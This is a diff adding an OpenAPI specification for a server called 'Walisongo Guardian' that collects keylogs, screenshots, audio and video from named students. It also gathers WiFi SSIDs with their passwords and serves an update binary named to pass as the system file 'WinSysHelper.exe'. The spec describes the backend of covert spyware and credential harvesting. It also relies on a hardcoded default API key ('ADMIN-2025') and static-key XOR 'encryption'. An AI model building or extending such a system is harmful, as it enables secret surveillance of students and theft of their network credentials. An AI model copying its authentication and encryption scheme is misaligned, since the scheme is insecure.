@@ -1,0 +1,514 @@
+openapi: 3.0.0
+info:
+  title: Walisongo Guardian Server API
+  version: 3.1.0
+  description: |
+    Secure data collection and monitoring server for Walisongo Guardian client application.
+    
+    All endpoints (except /health) require authentication via X-API-Key header.
+    
+    **Authentication:**
+    - Header: `X-API-Key`
+    - Default Value: `ADMIN-2025`
+  contact:
+    name: Walisongo Guardian Team
+  license:
+    name: PROPRIETARY
+
+servers:
+  - url: http://localhost:8080
+    description: Local development server
+  - url: https://your-domain.com
+    description: Production server (via reverse proxy)
+
+components:
+  securitySchemes:
+    ApiKeyAuth:
+      type: apiKey
+      in: header
+      name: X-API-Key
+      description: API authentication key
+
+  schemas:
+    FileMetadata:
+      type: object
+      properties:
+        file_id:
+          type: string
+          description: Unique file identifier
+          example: 20240428_143045_123_a1b2c3d4
+        original_filename:
+          type: string
+          description: Original filename
+          example: screenshot.png
+        data_type:
+          type: string
+          description: Type of data collected
+          enum: [screenshot, keylog, activity, video, audio, custom]
+        user_name:
+          type: string
+          description: Name of the user
+        user_class:
+          type: string
+          description: Class/group of the user
+        client_version:
+          type: string
+          description: Client application version
+          example: "1.6.3"
+        received_at:
+          type: string
+          format: date-time
+          description: Server timestamp when received
+        client_timestamp:
+          type: string
+          description: Client timestamp when file created
+        file_size:
+          type: integer
+          description: File size in bytes
+        file_hash:
+          type: string
+          description: SHA256 hash for integrity verification
+        status:
+          type: string
+          description: File processing status
+          enum: [uploading, complete, processing, failed]
+        stored_path:
+          type: string
+          description: Absolute path where file is stored
+        client_ip:
+          type: string
+          nullable: true
+          description: Client IP address
+        extra_metadata:
+          type: object
+          description: Additional metadata key-value pairs
+
+    ActiveStatusMetadata:
+      type: object
+      properties:
+        client_version:
+          type: string
+          example: "1.6.3"
+        wifi_ssid:
+          type: string
+          description: Connected WiFi SSID
+          example: MyWiFi
+        wifi_password:
+          type: string
+          description: WiFi password (encrypted)
+          example: "***"
+        received_at:
+          type: string
+          format: date-time
+          description: Server timestamp
+        client_ip:
+          type: string
+          nullable: true
+        user_name:
+          type: string
+        user_class:
+          type: string
+
+    HealthResponse:
+      type: object
+      properties:
+        status:
+          type: string
+          enum: [healthy, unhealthy]
+        version:
+          type: string
+        timestamp:
+          type: string
+          format: date-time
+
+    UpdateCheckResponse:
+      type: object
+      properties:
+        latest_hash:
+          type: string
+          description: SHA256 hash of latest executable
+        version:
+          type: string
+          description: Latest version number
+        status:
+          type: string
+          enum: [success, error]
+
+    StatsResponse:
+      type: object
+      properties:
+        total_files:
+          type: integer
+        total_users:
+          type: integer
+        total_data_types:
+          type: integer
+        total_size_bytes:
+          type: integer
+        total_size_mb:
+          type: number
+          format: double
+        type_distribution:
+          type: object
+          description: Count of files by type
+        index_last_updated:
+          type: string
+          format: date-time
+
+    FilesQueryResponse:
+      type: object
+      properties:
+        user:
+          type: string
+        class:
+          type: string
+        file_count:
+          type: integer
+        files:
+          type: array
+          items:
+            $ref: '#/components/schemas/FileMetadata'
+
+    ErrorResponse:
+      type: object
+      properties:
+        error:
+          type: string
+          description: Error message
+
+security:
+  - ApiKeyAuth: []
+
+paths:
+  /health:
+    get:
+      summary: Health check endpoint
+      description: Check if server is healthy and running
+      tags:
+        - System
+      operationId: healthCheck
+      security: []
+      responses:
+        '200':
+          description: Server is healthy
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/HealthResponse'
+
+  /upload:
+    post:
+      summary: Upload file with chunked transfer support
+      description: |
+        Upload file to server with support for chunked transfers.
+        
+        Format: Binary file data
+        
+        Data is automatically encrypted/decrypted using static key.
+        When all chunks are received, file is automatically finalized.
+      tags:
+        - Data Transfer
+      operationId: uploadFile
+      parameters:
+        - name: X-User
+          in: header
+          required: true
+          schema:
+            type: string
+          description: User info in format "Name[Class]"
+          example: "Ahmad[XI-A]"
+        - name: X-Type
+          in: header
+          required: true
+          schema:
+            type: string
+            enum: [screenshot, keylog, activity, video, audio, custom]
+          description: Type of data being uploaded
+        - name: X-File-ID
+          in: header
+          required: true
+          schema:
+            type: string
+          description: Unique file identifier
+        - name: X-Filename
+          in: header
+          required: true
+          schema:
+            type: string
+          description: Original filename
+        - name: X-Chunk-Num
+          in: header
+          required: true
+          schema:
+            type: integer
+          description: Current chunk number (0-indexed)
+        - name: X-Chunk-Total
+          in: header
+          required: true
+          schema:
+            type: integer
+          description: Total number of chunks
+        - name: X-Timestamp
+          in: header
+          required: false
+          schema:
+            type: string
+          description: Client timestamp
+        - name: X-Version
+          in: header
+          required: false
+          schema:
+            type: string
+          description: Client version
+      requestBody:
+        required: true
+        content:
+          application/octet-stream:
+            schema:
+              type: string
+              format: binary
+              description: Binary file content chunk
+      responses:
+        '200':
+          description: Chunk uploaded successfully
+        '400':
+          description: Invalid request (missing headers)
+        '401':
+          description: Unauthorized (invalid API key)
+        '500':
+          description: Server error
+
+  /post-active:
+    post:
+      summary: Send active status / heartbeat
+      description: |
+        Client sends active status including WiFi information.
+        
+        Data format: version|ssid|password
+        Example: 1.6.3|MyWiFi|mypassword
+        
+        Data is encrypted using XOR with static key before transmission.
+      tags:
+        - Telemetry
+      operationId: postActiveStatus
+      parameters:
+        - name: X-User
+          in: header
+          required: true
+          schema:
+            type: string
+          description: User info in format "Name[Class]"
+        - name: X-Client-IP
+          in: header
+          required: false
+          schema:
+            type: string
+          description: Client IP address
+      requestBody:
+        required: true
+        content:
+          application/octet-stream:
+            schema:
+              type: string
+              format: binary
+              description: Encrypted status data (version|ssid|password)
+      responses:
+        '200':
+          description: Status received and logged
+        '401':
+          description: Unauthorized
+        '500':
+          description: Server error
+
+  /check-update:
+    get:
+      summary: Check for software updates
+      description: Get the hash and version of the latest client executable
+      tags:
+        - Updates
+      operationId: checkUpdate
+      responses:
+        '200':
+          description: Update information retrieved
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/UpdateCheckResponse'
+        '401':
+          description: Unauthorized
+
+  /get-update:
+    get:
+      summary: Download update executable
+      description: Download the latest WinSysHelper.exe binary
+      tags:
+        - Updates
+      operationId: getUpdate
+      responses:
+        '200':
+          description: Executable binary
+          content:
+            application/octet-stream:
+              schema:
+                type: string
+                format: binary
+        '401':
+          description: Unauthorized
+        '404':
+          description: Update not found
+
+  /api/files/{user}/{class}:
+    get:
+      summary: Query files by user
+      description: Get all files uploaded by specific user
+      tags:
+        - Query
+      operationId: queryFilesByUser
+      parameters:
+        - name: user
+          in: path
+          required: true
+          schema:
+            type: string
+          description: User name
+        - name: class
+          in: path
+          required: true
+          schema:
+            type: string
+          description: User class
+      responses:
+        '200':
+          description: Files retrieved
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/FilesQueryResponse'
+        '401':
+          description: Unauthorized
+
+  /api/files/type/{file_type}:
+    get:
+      summary: Query files by type
+      description: Get all files of specific type
+      tags:
+        - Query
+      operationId: queryFilesByType
+      parameters:
+        - name: file_type
+          in: path
+          required: true
+          schema:
+            type: string
+            enum: [screenshot, keylog, activity, video, audio, custom]
+          description: File type
+      responses:
+        '200':
+          description: Files retrieved
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  type:
+                    type: string
+                  file_count:
+                    type: integer
+                  files:
+                    type: array
+                    items:
+                      $ref: '#/components/schemas/FileMetadata'
+        '401':
+          description: Unauthorized
+
+  /api/files/date/{date}:
+    get:
+      summary: Query files by date
+      description: Get all files from specific date (YYYY-MM-DD format)
+      tags:
+        - Query
+      operationId: queryFilesByDate
+      parameters:
+        - name: date
+          in: path
+          required: true
+          schema:
+            type: string
+            format: date
+          description: Date in YYYY-MM-DD format
+          example: "2024-04-28"
+      responses:
+        '200':
+          description: Files retrieved
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  date:
+                    type: string
+                  file_count:
+                    type: integer
+                  files:
+                    type: array
+                    items:
+                      $ref: '#/components/schemas/FileMetadata'
+        '401':
+          description: Unauthorized
+
+  /api/files/{file_id}/metadata:
+    get:
+      summary: Get file metadata
+      description: Get complete metadata for specific file
+      tags:
+        - Query
+      operationId: getFileMetadata
+      parameters:
+        - name: file_id
+          in: path
+          required: true
+          schema:
+            type: string
+          description: File ID
+      responses:
+        '200':
+          description: Metadata retrieved
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/FileMetadata'
+        '401':
+          description: Unauthorized
+        '404':
+          description: File not found
+
+  /api/stats:
+    get:
+      summary: Get server statistics
+      description: Get comprehensive server statistics and metrics
+      tags:
+        - Analytics
+      operationId: getStats
+      responses:
+        '200':
+          description: Statistics retrieved
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/StatsResponse'
+        '401':
+          description: Unauthorized
+
+tags:
+  - name: System
+    description: Server health and status
+  - name: Data Transfer
+    description: File upload endpoints
+  - name: Telemetry
+    description: Client telemetry and heartbeat
+  - name: Updates
+    description: Software update management
+  - name: Query
+    description: Data query and retrieval
+  - name: Analytics
+    description: Server analytics and statistics
